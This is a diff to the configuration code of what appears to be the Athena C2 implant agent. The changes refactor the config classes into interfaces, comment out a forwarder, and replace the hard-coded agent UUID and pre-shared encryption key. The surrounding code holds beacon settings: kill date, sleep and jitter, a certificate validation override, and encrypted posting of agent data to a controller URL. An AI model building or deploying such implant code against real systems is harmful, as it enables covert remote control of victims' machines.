@@ -1,27 +1,24 @@
+﻿using Athena.Models.Config;
 using Athena.Utilities;
 using Newtonsoft.Json;
-using System;
 using System.Net;
-using System.Net.Http;
-using System.Net.Http.Headers;
 using System.Net.Security;
-using System.Threading.Tasks;
 
 namespace Athena
 {
-    public class MythicConfig
+    public class Config : IConfig
     {
-        public HTTP currentConfig { get; set; }
+        public IProfile currentConfig { get; set; }
         public static string uuid { get; set; }
         public DateTime killDate { get; set; }
         public int sleep { get; set; }
         public int jitter { get; set; }
-        public Forwarder forwarder { get; set; }
-
-        public MythicConfig()
+        //public Forwarder forwarder { get; set; }
+        public IForwarder forwarder { get; set; }
+        public Config()
         {
 
-            uuid = "9b42b6a8-dbbf-4f2c-b847-500900ee3514";
+            uuid = "77db85ec-17c2-4cac-a1c6-cf71c4d7ae52";
             DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
             this.killDate = kd;
             int sleep = int.TryParse("5", out sleep) ? sleep : 60;
@@ -29,10 +26,10 @@ namespace Athena
             int jitter = int.TryParse("5", out jitter) ? jitter : 10;
             this.jitter = jitter;
             this.currentConfig = new HTTP();
-            this.forwarder = new Forwarder();
+            //this.forwarder = new Forwarder();
         }
     }
-    public class HTTP
+    public class HTTP : IProfile
     {
         public string userAgent { get; set; }
         public string hostHeader { get; set; }
@@ -63,7 +60,7 @@ namespace Athena
             this.proxyHost = ":";
             this.proxyPass = "";
             this.proxyUser = "";
-            this.psk = "AnrJ7JO6qMc5zic6kVRGqvrSrGv+2SC20fLI+1NTatk=";
+            this.psk = "aNfCcVlUpssws4DBijeKRKtJmlz1wh54AF08XUyS2rE=";
 
             //Might need to make this configurable
             ServicePointManager.ServerCertificateValidationCallback =
@@ -104,7 +101,7 @@ namespace Athena
 
             if (!string.IsNullOrEmpty(this.psk))
             {
-                this.crypt = new PSKCrypto(MythicConfig.uuid, this.psk);
+                this.crypt = new PSKCrypto(Config.uuid, this.psk);
                 this.encrypted = true;
             }
 
@@ -121,7 +118,7 @@ namespace Athena
                 }
                 else
                 {
-                    json = await Misc.Base64Encode(MythicConfig.uuid + json);
+                    json = await Misc.Base64Encode(Config.uuid + json);
                 }
 
                 var response = await this.client.PostAsync(this.postURL, new StringContent(json));
